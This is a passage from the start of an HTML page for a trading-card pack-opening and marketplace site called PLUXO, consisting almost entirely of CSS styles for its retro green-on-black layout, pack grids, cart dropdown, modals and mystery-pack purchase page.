<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PLUXO - Collect â€¢ Rip â€¢ Redeem â€¢ Repeat</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --green: #00ff00;
            --green-dark: #00cc00;
            --green-light: #33ff33;
            --black: #000000;
            --dark-gray: #1a1a1a;
            --gray: #333333;
            --white: #ffffff;
            --red: #ff0000;
        }

        body {
            font-family: 'Press Start 2P', monospace;
            background: var(--black);
            color: var(--white);
            overflow-x: hidden;
            min-height: 100vh;
            position: relative;
        }

        /* Snowflake Animation */
        .snowflakes {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }

        .snowflake {
            position: absolute;
            color: rgba(255, 255, 255, 0.8);
            font-size: 10px;
            animation: fall linear infinite;
        }

        @keyframes fall {
            to {
                transform: translateY(100vh) rotate(360deg);
            }
        }

        /* Top Header */
        .top-header {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            height: 70px;
            background: var(--black);
            border-bottom: 2px solid var(--green);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 20px;
            z-index: 1000;
        }

        .logo {
            font-size: 24px;
            color: var(--green);
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .logo .santa-hat {
            font-size: 16px;
        }

        .beta-tag {
            background: var(--dark-gray);
            color: var(--white);
            padding: 4px 8px;
            font-size: 8px;
            margin-left: 10px;
            border: 1px solid var(--gray);
        }

        .header-center {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .new-badge {
            background: var(--green);
            color: var(--black);
            padding: 6px 10px;
            font-size: 8px;
            border: 2px solid var(--green);
        }

        .mystery-notification {
            background: var(--dark-gray);
            color: var(--green);
            padding: 6px 12px;
            font-size: 8px;
            border: 2px solid var(--green);
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .rank-info {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 10px;
        }

        .progress-bar {
            width: 100px;
            height: 8px;
            background: var(--dark-gray);
            border: 1px solid var(--green);
            position: relative;
        }

        .progress-fill {
            height: 100%;
            background: var(--green);
            width: 0%;
        }

        .user-button {
            background: var(--dark-gray);
            color: var(--green);
            padding: 8px 15px;
            font-size: 8px;
            border: 2px solid var(--green);
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .get-started-btn {
            background: var(--green);
            color: var(--black);
            padding: 8px 15px;
            font-size: 8px;
            border: 2px solid var(--green);
            cursor: pointer;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        /* Main Content */
        .main-content {
            margin-top: 70px;
            padding-bottom: 80px;
            min-height: calc(100vh - 150px);
            position: relative;
            z-index: 2;
        }

        /* Homepage */
        .homepage-hero {
            padding: 60px 20px;
            text-align: center;
        }

        .slogan {
            font-size: 48px;
            line-height: 1.2;
            margin-bottom: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-wrap: wrap;
            gap: 15px;
        }

        .slogan-word {
            display: inline-block;
        }

        .slogan-word.green {
            color: var(--green);
            background: var(--green);
            color: var(--black);
            padding: 10px 15px;
        }

        .slogan-icon {
            font-size: 32px;
            margin: 0 10px;
        }

        .hero-subtitle {
            font-size: 12px;
            color: var(--gray);
            margin: 30px 0;
            line-height: 1.8;
        }

        .cta-section {
            margin: 50px 0;
        }

        .cta-text {
            font-size: 14px;
            margin-bottom: 20px;
        }

        .open-pack-btn {
            background: var(--red);
            color: var(--white);
            padding: 15px 40px;
            font-size: 12px;
            border: 3px solid var(--white);
            cursor: pointer;
            font-family: 'Press Start 2P', monospace;
            margin: 20px 0;
        }

        .open-pack-btn:hover {
            background: var(--white);
            color: var(--red);
            transform: scale(1.05);
            box-shadow: 0 5px 20px rgba(255, 0, 0, 0.5);
        }

        .open-pack-btn:active {
            transform: scale(0.98);
        }

        /* Latest Pulls Section */
        .latest-pulls {
            padding: 40px 20px;
        }

        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }

        .section-title {
            font-size: 16px;
            color: var(--green);
            border: 2px solid var(--green);
            padding: 10px 20px;
            background: var(--dark-gray);
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }

        .live-feed-btn {
            font-size: 12px;
            color: var(--green);
            border: 2px solid var(--green);
            padding: 8px 15px;
            background: var(--dark-gray);
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .pulls-grid {
            display: flex;
            gap: 20px;
            overflow-x: auto;
            padding: 20px 0;
            scroll-behavior: smooth;
        }

        .pulls-grid::-webkit-scrollbar {
            height: 8px;
        }

        .pulls-grid::-webkit-scrollbar-track {
            background: var(--dark-gray);
        }

        .pulls-grid::-webkit-scrollbar-thumb {
            background: var(--green);
            border-radius: 4px;
        }

        .pulls-grid::-webkit-scrollbar-thumb:hover {
            background: var(--green-light);
        }

        .pull-card {
            min-width: 280px;
            background: var(--dark-gray);
            border: 2px solid var(--green);
            padding: 15px;
            transition: all 0.3s ease;
            opacity: 0;
            transform: translateX(-20px);
            animation: slideInLeft 0.5s ease forwards;
        }

        .pull-card:nth-child(1) { animation-delay: 0.1s; }
        .pull-card:nth-child(2) { animation-delay: 0.2s; }
        .pull-card:nth-child(3) { animation-delay: 0.3s; }
        .pull-card:nth-child(4) { animation-delay: 0.4s; }

        @keyframes slideInLeft {
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .pull-card:hover {
            transform: translateX(5px);
            border-color: var(--green-light);
            box-shadow: 0 5px 20px rgba(0, 255, 0, 0.2);
        }

        .pull-time {
            font-size: 8px;
            color: var(--gray);
            margin-bottom: 10px;
        }

        .pull-card-image {
            width: 100%;
            aspect-ratio: 63/88;
            background: var(--gray);
            border: 1px solid var(--green);
            margin-bottom: 10px;
            position: relative;
            overflow: hidden;
            transition: transform 0.3s ease;
        }

        .pull-card:hover .pull-card-image {
            transform: scale(1.05);
        }

        .pull-pack-info {
            font-size: 8px;
            color: var(--green);
        }

        /* Features Grid */
        .features-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            padding: 40px 20px;
        }

        .feature-card {
            background: var(--dark-gray);
            border: 2px solid var(--green);
            padding: 30px;
            text-align: center;
            transition: all 0.3s ease;
            opacity: 0;
            transform: translateY(30px);
            animation: fadeInUp 0.6s ease forwards;
        }

        .feature-card:nth-child(1) { animation-delay: 0.1s; }
        .feature-card:nth-child(2) { animation-delay: 0.2s; }
        .feature-card:nth-child(3) { animation-delay: 0.3s; }
        .feature-card:nth-child(4) { animation-delay: 0.4s; }
        .feature-card:nth-child(5) { animation-delay: 0.5s; }
        .feature-card:nth-child(6) { animation-delay: 0.6s; }
        .feature-card:nth-child(7) { animation-delay: 0.7s; }

        .feature-card:hover {
            transform: translateY(-10px);
            border-color: var(--green-light);
            box-shadow: 0 15px 35px rgba(0, 255, 0, 0.2);
        }

        .feature-icon {
            transition: transform 0.3s ease;
        }

        .feature-card:hover .feature-icon {
            transform: scale(1.2) rotate(5deg);
        }

        .feature-icon {
            font-size: 48px;
            margin-bottom: 20px;
        }

        .feature-title {
            font-size: 14px;
            color: var(--green);
            margin-bottom: 15px;
        }

        .feature-description {
            font-size: 8px;
            color: var(--gray);
            line-height: 1.6;
        }

        .coming-soon {
            background: var(--green);
            color: var(--black);
            padding: 4px 8px;
            font-size: 8px;
            margin-bottom: 10px;
            display: inline-block;
        }

        /* Market Page */
        .market-page {
            padding: 40px 20px;
        }

        .market-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            flex-wrap: wrap;
            gap: 15px;
        }

        .market-tabs {
            display: flex;
            gap: 10px;
        }

        .market-tab {
            background: var(--dark-gray);
            color: var(--white);
            border: 2px solid var(--gray);
            padding: 10px 20px;
            font-size: 10px;
            cursor: pointer;
        }

        .market-tab.active {
            border-color: var(--green);
            color: var(--green);
        }

        .search-bar {
            background: var(--dark-gray);
            border: 2px solid var(--green);
            padding: 10px 15px;
            color: var(--white);
            font-size: 8px;
            font-family: 'Press Start 2P', monospace;
            min-width: 300px;
        }

        .market-filters {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .filter-select {
            background: var(--dark-gray);
            color: var(--green);
            border: 2px solid var(--green);
            padding: 8px 12px;
            font-size: 8px;
            font-family: 'Press Start 2P', monospace;
            cursor: pointer;
        }

        .view-toggle {
            display: flex;
            gap: 5px;
        }

        .view-icon {
            width: 30px;
            height: 30px;
            background: var(--dark-gray);
            border: 2px solid var(--gray);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            font-size: 12px;
        }

        .view-icon.active {
            border-color: var(--green);
            background: var(--green);
            color: var(--black);
        }

        .cards-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 20px;
            margin-top: 30px;
        }

        .market-card {
            background: var(--dark-gray);
            border: 2px solid var(--green);
            padding: 15px;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            opacity: 0;
            transform: translateY(20px);
            animation: fadeInUp 0.6s ease forwards;
        }

        .market-card:nth-child(1) { animation-delay: 0.1s; }
        .market-card:nth-child(2) { animation-delay: 0.2s; }
        .market-card:nth-child(3) { animation-delay: 0.3s; }
        .market-card:nth-child(4) { animation-delay: 0.4s; }
        .market-card:nth-child(5) { animation-delay: 0.5s; }
        .market-card:nth-child(6) { animation-delay: 0.6s; }
        .market-card:nth-child(7) { animation-delay: 0.7s; }
        .market-card:nth-child(8) { animation-delay: 0.8s; }

        @keyframes fadeInUp {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .market-card:hover {
            transform: translateY(-10px) scale(1.02);
            border-color: var(--green-light);
            box-shadow: 0 10px 30px rgba(0, 255, 0, 0.3);
        }

        .card-image {
            transition: transform 0.3s ease;
        }

        .market-card:hover .card-image {
            transform: scale(1.05);
        }

        .card-badges {
            display: flex;
            gap: 5px;
            margin-bottom: 10px;
        }

        .badge {
            font-size: 6px;
            padding: 4px 6px;
            background: var(--green);
            color: var(--black);
        }

        .card-image {
            width: 100%;
            aspect-ratio: 63/88;
            background: linear-gradient(135deg, var(--gray) 0%, var(--dark-gray) 100%);
            border: 1px solid var(--green);
            margin-bottom: 10px;
            position: relative;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .card-image::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.3), transparent);
            transition: left 0.5s ease;
        }

        .market-card:hover .card-image::before {
            left: 100%;
        }

        .card-name {
            font-size: 10px;
            color: var(--white);
            margin-bottom: 5px;
        }

        .card-price {
            font-size: 12px;
            color: var(--green);
        }

        .card-rarity {
            font-size: 8px;
            color: var(--gray);
            margin-top: 5px;
        }

        /* Packs Page */
        .packs-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 18px;
            padding: 40px 24px;
        }

        .packs-scroller {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
            gap: 24px;
        }

        .pack-item {
            background: var(--dark-gray);
            border: 2px solid var(--green);
            padding: 15px;
            text-align: center;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            opacity: 0;
            transform: scale(0.9);
            animation: scaleIn 0.5s ease forwards;
        }

        .pack-item:nth-child(1) { animation-delay: 0.1s; }
        .pack-item:nth-child(2) { animation-delay: 0.15s; }
        .pack-item:nth-child(3) { animation-delay: 0.2s; }
        .pack-item:nth-child(4) { animation-delay: 0.25s; }
        .pack-item:nth-child(5) { animation-delay: 0.3s; }
        .pack-item:nth-child(6) { animation-delay: 0.35s; }

        @keyframes scaleIn {
            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        .pack-item:hover {
            transform: scale(1.05) translateY(-5px);
            border-color: var(--green-light);
            box-shadow: 0 10px 25px rgba(0, 255, 0, 0.3);
        }

        .pack-availability {
            font-size: 8px;
            color: var(--gray);
            margin-bottom: 10px;
        }

        .pack-image {
            width: 100%;
            aspect-ratio: 1;
            background: var(--gray);
            border: 1px solid var(--green);
            margin-bottom: 10px;
            position: relative;
            overflow: hidden;
            transition: transform 0.3s ease;
        }

        .pack-item:hover .pack-image {
            transform: rotateY(5deg) rotateX(5deg);
        }

        .pack-name {
            font-size: 10px;
            color: var(--white);
            margin-bottom: 5px;
        }

        .pack-price {
            font-size: 12px;
            color: var(--green);
        }

        /* Premium custom pack cards */
        .pack-card {
            position: relative;
            --pack-tilt: 0deg;
            --pack-nudge: 0px;
            --pack-scale: 1;
            --pack-lift: 0px;
            --pack-hover-lift: -10px;
            --pack-hover-scale: 1.03;
            transform: rotate(var(--pack-tilt, 0deg)) translateY(calc(var(--pack-nudge, 0px) + var(--pack-lift, 0px))) scale(var(--pack-scale, 1));
            transition: transform 0.25s cubic-bezier(0.34,1.56,0.64,1), box-shadow 0.25s ease, filter 0.2s ease;
            will-change: transform, box-shadow, filter;
            scroll-snap-align: center;
        }

        .pack-card:hover {
            --pack-scale: var(--pack-hover-scale);
            --pack-lift: var(--pack-hover-lift);
            filter: brightness(1.06) saturate(1.05);
        }

        .pack-card button {
            min-height: 48px;
            transition: transform 0.12s ease, filter 0.12s ease;
        }

        .pack-card button:active { transform: scale(0.95); }

        .pack-card:hover button {
            animation: btnPulse 1.5s ease infinite !important;
        }

        .coming-soon-card {
            --pack-hover-lift: 0px;
        }

        .coming-soon-card:hover {
            --pack-scale: 1;
            --pack-lift: 0px;
            filter: none;
        }

        .pack-card.spark::after {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: inherit;
            background: radial-gradient(circle, rgba(255,255,255,0.45) 0%, rgba(255,255,255,0) 60%);
            opacity: 0;
            animation: packSpark 0.6s ease-out;
            pointer-events: none;
        }

        .live-energy {
            grid-column: 1 / -1;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 10px 12px;
            background: #0b0b0b;
            border: 1px solid #222;
            border-radius: 6px;
            font-size: 7px;
            color: #7dffb2;
            letter-spacing: 1px;
            box-shadow: 0 0 12px rgba(0,255,150,0.25);
            text-transform: uppercase;
        }

        .live-energy .dot {
            width: 6px;
            height: 6px;
            background: #ff3333;
            border-radius: 50%;
            box-shadow: 0 0 8px rgba(255,51,51,0.8);
            animation: livePulse 1.2s ease-in-out infinite;
        }

        /* Expansions Page */
        .expansions-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 40px 20px 20px;
            flex-wrap: wrap;
            gap: 15px;
        }

        .expansions-title {
            font-size: 32px;
            color: var(--green);
        }

        .language-selector {
            display: flex;
            gap: 5px;
        }

        .lang-btn {
            background: var(--dark-gray);
            color: var(--white);
            border: 2px solid var(--gray);
            padding: 8px 15px;
            font-size: 8px;
            cursor: pointer;
        }

        .lang-btn.active {
            border-color: var(--green);
            color: var(--green);
        }

        .series-filters {
            display: flex;
            gap: 10px;
            padding: 20px;
            overflow-x: auto;
        }

        .series-filter {
            background: var(--dark-gray);
            color: var(--white);
            border: 2px solid var(--gray);
            padding: 8px 15px;
            font-size: 8px;
            cursor: pointer;
            white-space: nowrap;
        }

        .series-filter.active {
            border-color: var(--green);
            color: var(--green);
            background: var(--green);
            color: var(--black);
        }

        .expansions-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 20px;
            padding: 20px;
        }

        .expansion-card {
            background: var(--dark-gray);
            border: 2px solid var(--green);
            padding: 20px;
            text-align: center;
        }

        .expansion-image {
            width: 100%;
            aspect-ratio: 1;
            background: var(--gray);
            border: 1px solid var(--green);
            margin-bottom: 15px;
            position: relative;
            overflow: hidden;
            transition: transform 0.3s ease;
        }

        .expansion-card:hover .expansion-image {
            transform: scale(1.1);
        }

        .expansion-card {
            transition: all 0.3s ease;
            cursor: pointer;
        }

        .expansion-card:hover {
            transform: translateY(-5px);
            border-color: var(--green-light);
            box-shadow: 0 10px 25px rgba(0, 255, 0, 0.2);
        }

        .expansion-name {
            font-size: 12px;
            color: var(--white);
            margin-bottom: 10px;
        }

        .expansion-info {
            font-size: 8px;
            color: var(--gray);
            line-height: 1.6;
        }

        /* Store Page */
        .store-hero {
            padding: 40px 20px;
            text-align: center;
        }

        .store-title {
            font-size: 32px;
            color: var(--green);
            margin-bottom: 30px;
            border-bottom: 2px dashed var(--green);
            padding-bottom: 20px;
        }

        .store-featured {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
            padding: 40px 20px;
        }

        .featured-item {
            background: var(--dark-gray);
            border: 2px solid var(--green);
            padding: 30px;
        }

        .featured-image {
            width: 100%;
            aspect-ratio: 16/9;
            background: var(--gray);
            border: 1px solid var(--green);
            margin-bottom: 20px;
        }

        .featured-title {
            font-size: 14px;
            color: var(--green);
            margin-bottom: 10px;
        }

        .featured-description {
            font-size: 8px;
            color: var(--gray);
            line-height: 1.6;
        }

        /* Bottom Navigation */
        .bottom-nav {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            height: 70px;
            background: var(--black);
            border-top: 2px solid var(--green);
            display: flex;
            align-items: center;
            justify-content: space-around;
            z-index: 1000;
        }

        .nav-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 5px;
            color: var(--gray);
            text-decoration: none;
            font-size: 8px;
            cursor: pointer;
            padding: 10px;
            transition: all 0.2s ease;
        }

        .nav-item:hover {
            color: var(--green-light);
            transform: translateY(-2px);
        }

        .nav-item.active {
            color: var(--green);
            background: rgba(0, 255, 0, 0.1);
        }

        .nav-icon {
            font-size: 20px;
        }

        /* Modals */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.9);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .modal-overlay.active {
            display: flex;
            opacity: 1;
        }

        .modal {
            background: var(--dark-gray);
            border: 3px solid var(--green);
            padding: 40px;
            max-width: 500px;
            width: 90%;
            position: relative;
        }

        .modal-close {
            position: absolute;
            top: 15px;
            right: 15px;
            background: none;
            border: none;
            color: var(--white);
            font-size: 20px;
            cursor: pointer;
            font-family: 'Press Start 2P', monospace;
        }

        .modal-title {
            font-size: 16px;
            color: var(--green);
            margin-bottom: 20px;
            text-align: center;
        }

        .modal-description {
            font-size: 8px;
            color: var(--gray);
            margin-bottom: 30px;
            text-align: center;
            line-height: 1.6;
        }

        .modal-buttons {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .modal-btn {
            background: var(--green);
            color: var(--black);
            border: 2px solid var(--green);
            padding: 15px;
            font-size: 10px;
            font-family: 'Press Start 2P', monospace;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .modal-btn.secondary {
            background: var(--dark-gray);
            color: var(--green);
        }

        .modal-btn:hover {
            background: var(--green-light);
            transform: scale(1.02);
        }

        .modal-btn:active {
            transform: scale(0.98);
        }

        .modal {
            animation: modalSlideIn 0.3s ease;
        }

        @keyframes modalSlideIn {
            from {
                opacity: 0;
                transform: scale(0.9) translateY(-20px);
            }
            to {
                opacity: 1;
                transform: scale(1) translateY(0);
            }
        }

/* Enhanced Login Modal */
        .login-modal {
            animation: modalBounceIn 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
        }

        @keyframes modalBounceIn {
            0% {
                opacity: 0;
                transform: scale(0.3) translateY(-100px) rotate(10deg);
            }
            50% {
                transform: scale(1.05) translateY(10px) rotate(-2deg);
            }
            70% {
                transform: scale(0.95) translateY(-5px) rotate(1deg);
            }
            100% {
                opacity: 1;
                transform: scale(1) translateY(0) rotate(0deg);
            }
        }

        @keyframes celebrateParticle {
            0% {
                opacity: 1;
                transform: translate(-50%, -50%) rotate(var(--rotation)) translateY(0);
            }
            100% {
                opacity: 0;
                transform: translate(-50%, -50%) rotate(var(--rotation)) translateY(-200px);
            }
        }

        /* Profile Hover Cart */
        .user-button {
            position: relative;
        }

        .cart-dropdown {
            position: absolute;
            top: 100%;
            right: 0;
            background: var(--dark-gray);
            border: 2px solid var(--green);
            padding: 15px;
            min-width: 250px;
            margin-top: 10px;
            opacity: 0;
            visibility: hidden;
            transform: translateY(-10px);
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            z-index: 1001;
        }

        .user-button:hover .cart-dropdown {
            opacity: 1;
            visibility: visible;
            transform: translateY(0);
        }

        .cart-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid var(--gray);
        }

        .cart-title {
            font-size: 10px;
            color: var(--green);
        }

        .cart-count {
            background: var(--green);
            color: var(--black);
            padding: 2px 6px;
            font-size: 8px;
            border-radius: 10px;
        }

        .cart-items {
            max-height: 200px;
            overflow-y: auto;
            margin-bottom: 15px;
        }

        .cart-item {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 8px 0;
            border-bottom: 1px solid var(--gray);
            font-size: 8px;
        }

        .cart-item:last-child {
            border-bottom: none;
        }

        .cart-item-image {
            width: 30px;
            height: 42px;
            background: var(--gray);
            border: 1px solid var(--green);
        }

        .cart-item-info {
            flex: 1;
        }

        .cart-item-name {
            color: var(--white);
            margin-bottom: 2px;
        }

        .cart-item-price {
            color: var(--green);
        }

        .cart-total {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 0;
            border-top: 1px solid var(--gray);
            margin-bottom: 15px;
        }

        .cart-total-label {
            font-size: 10px;
            color: var(--white);
        }

        .cart-total-amount {
            font-size: 12px;
            color: var(--green);
        }

        .cart-actions {
            display: flex;
            gap: 10px;
        }

        .cart-btn {
            flex: 1;
            background: var(--green);
            color: var(--black);
            border: none;
            padding: 8px;
            font-size: 8px;
            font-family: 'Press Start 2P', monospace;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .cart-btn:hover {
            background: var(--green-light);
            transform: scale(1.02);
        }

        .cart-btn.secondary {
            background: var(--dark-gray);
            color: var(--green);
            border: 1px solid var(--green);
        }

        /* Notification */
        .notification {
            position: fixed;
            bottom: 90px;
            right: 20px;
            background: var(--dark-gray);
            border: 2px solid var(--green);
            padding: 20px;
            max-width: 300px;
            z-index: 1500;
        }

        .notification-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }

        .notification-title {
            font-size: 10px;
            color: var(--green);
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .notification-close {
            background: none;
            border: none;
            color: var(--white);
            cursor: pointer;
            font-size: 16px;
        }

        .notification-text {
            font-size: 8px;
            color: var(--gray);
            margin-bottom: 15px;
            line-height: 1.6;
        }

        .notification-btn {
            background: var(--green);
            color: var(--black);
            border: none;
            padding: 10px 20px;
            font-size: 8px;
            font-family: 'Press Start 2P', monospace;
            cursor: pointer;
            width: 100%;
        }

        /* Page Container */
        .page {
            display: none;
            opacity: 0;
            transform: translateY(20px);
            transition: opacity 0.3s ease, transform 0.3s ease;
        }

        .page.active {
            display: block;
            opacity: 1;
            transform: translateY(0);
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        .slogan-word {
            animation: bounceIn 0.8s ease;
        }

        .slogan-word:nth-child(1) { animation-delay: 0.1s; }
        .slogan-word:nth-child(3) { animation-delay: 0.3s; }
        .slogan-word:nth-child(5) { animation-delay: 0.5s; }
        .slogan-word:nth-child(7) { animation-delay: 0.7s; }

        @keyframes bounceIn {
            0% {
                opacity: 0;
                transform: scale(0.3);
            }
            50% {
                transform: scale(1.1);
            }
            100% {
                opacity: 1;
                transform: scale(1);
            }

        }

        .open-pack-btn {
            animation: pulse 2s ease infinite;
        }

        @keyframes pulse {
            0%, 100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.05);
            }
        }

        /* Mystery Pack Page */
        .mystery-pack-page {
            padding: 40px 20px;
            min-height: calc(100vh - 150px);
        }

        .mystery-pack-container {
            display: grid;
            grid-template-columns: 1fr 300px 1fr;
            gap: 30px;
            max-width: 1400px;
            margin: 0 auto;
        }

        .mystery-pack-left {
            display: flex;
            flex-direction: column;
            gap: 30px;
        }

        .mystery-pack-title {
            font-size: 24px;
            color: var(--white);
            margin-bottom: 15px;
        }

        .mystery-pack-description {
            font-size: 8px;
            color: var(--gray);
            line-height: 1.6;
            margin-bottom: 30px;
        }

        .odds-section {
            background: var(--dark-gray);
            border: 2px solid var(--green);
            padding: 20px;
            margin-bottom: 30px;
        }

        .odds-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }

        .odds-title {
            font-size: 12px;
            color: var(--white);
        }

        .expected-value {
            font-size: 10px;
            color: var(--green);
        }

        .odds-table {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .odds-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 0;
            border-bottom: 1px solid var(--gray);
        }

        .odds-range {
            font-size: 8px;
            color: var(--white);
        }

        .odds-percent {
            font-size: 8px;
            color: var(--green);
        }

        .recent-pulls-section {
            background: var(--dark-gray);
            border: 2px solid var(--green);
            padding: 20px;
        }

        .recent-pulls-title {
            font-size: 12px;
            color: var(--white);
            margin-bottom: 5px;
        }

        .recent-pulls-subtitle {
            font-size: 7px;
            color: var(--gray);
            margin-bottom: 15px;
        }

        .recent-pulls-tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }

        .pull-tab {
            background: var(--dark-gray);
            color: var(--white);
            border: 2px solid var(--gray);
            padding: 6px 12px;
            font-size: 8px;
            cursor: pointer;
            font-family: 'Press Start 2P', monospace;
        }

        .pull-tab.active {
            border-color: var(--green);
            color: var(--green);
            background: var(--green);
            color: var(--black);
        }

        .recent-pulls-list {
            max-height: 400px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .recent-pull-item {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px;
            background: var(--black);
            border: 1px solid var(--gray);
        }

        .recent-pull-images {
            display: flex;
            gap: 5px;
        }

        .recent-pull-image {
            width: 40px;
            height: 56px;
            background: var(--gray);
            border: 1px solid var(--green);
        }

        .recent-pull-info {
            flex: 1;
            font-size: 8px;
            color: var(--white);
        }

        .recent-pull-price {
            font-size: 10px;
            color: var(--green);
        }

        .recent-pull-time {
            font-size: 7px;
            color: var(--gray);
        }

        .mystery-pack-center {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .mystery-question-mark {
            font-size: 200px;
            color: var(--green);
            text-shadow: 0 0 30px var(--green);
            animation: glow 2s ease-in-out infinite alternate;
        }

        @keyframes glow {
            from {
                text-shadow: 0 0 30px var(--green);
            }
            to {
                text-shadow: 0 0 50px var(--green), 0 0 70px var(--green);
            }
        }

        .mystery-pack-right {
            display: flex;
            flex-direction: column;
            gap: 30px;
        }

        .purchase-section {
            background: var(--dark-gray);
            border: 2px solid var(--green);
            padding: 30px;
        }

        .purchase-title {
            font-size: 14px;
            color: var(--white);
            margin-bottom: 20px;
        }

        .price-input-group,
        .quantity-input-group {
            margin-bottom: 20px;
        }

        .price-input-group label,
        .quantity-input-group label {
            display: block;
            font-size: 8px;
            color: var(--gray);
            margin-bottom: 8px;
        }

        .price-display {
            background: var(--green);
            color: var(--black);
            padding: 12px;
            font-size: 14px;
            text-align: center;
            border: 2px solid var(--green);
        }

        .quantity-controls {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .quantity-btn {
            background: var(--dark-gray);
            color: var(--green);
            border: 2px solid var(--green);
            width: 40px;
            height: 40px;
            font-size: 16px;
            cursor: pointer;
            font-family: 'Press Start 2P', monospace;
            transition: all 0.2s ease;
        }

        .quantity-btn:hover {
            background: var(--green);
            color: var(--black);
        }

        .quantity-input {
            background: var(--dark-gray);
            color: var(--white);
            border: 2px solid var(--green);
            padding: 10px;
            font-size: 12px;
            width: 80px;
            text-align: center;
            font-family: 'Press Start 2P', monospace;
        }

        .purchase-btn {
            background: var(--green);
            color: var(--black);
            border: 2px solid var(--green);
            padding: 15px;
            font-size: 12px;
            width: 100%;
            cursor: pointer;
            font-family: 'Press Start 2P', monospace;
            transition: all 0.2s ease;
            margin-top: 20px;
        }

        .purchase-btn:hover {
            background: var(--green-light);
            transform: scale(1.02);
        }

        .purchase-btn:disabled {
            background: var(--gray);
            color: var(--dark-gray);
            cursor: not-allowed;
            opacity: 0.5;
        }

        .chase-packs-section {
            background: var(--dark-gray);
            border: 2px solid var(--green);
            padding: 20px;
        }

        .chase-packs-title {
            font-size: 12px;
            color: var(--white);
            margin-bottom: 5px;
        }

        .chase-packs-subtitle {
            font-size: 7px;
            color: var(--gray);
            margin-bottom: 15px;
        }

        .chase-packs-grid {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .chase-pack-item {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px;
            background: var(--black);
            border: 1px solid var(--gray);
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .chase-pack-item:hover {
            border-color: var(--green);
            transform: translateX(5px);
            background: #111;
        }

        .chase-pack-item {
            justify-content: space-between;
        }

        .chase-pack-image {
            width: 60px;
            height: 84px;
            background: var(--gray);
            border: 1px solid var(--green);
        }

        .chase-pack-info {
            flex: 1;
        }

        .chase-pack-name {
            font-size: 8px;
            color: var(--white);
            margin-bottom: 5px;
        }

        .chase-pack-price {
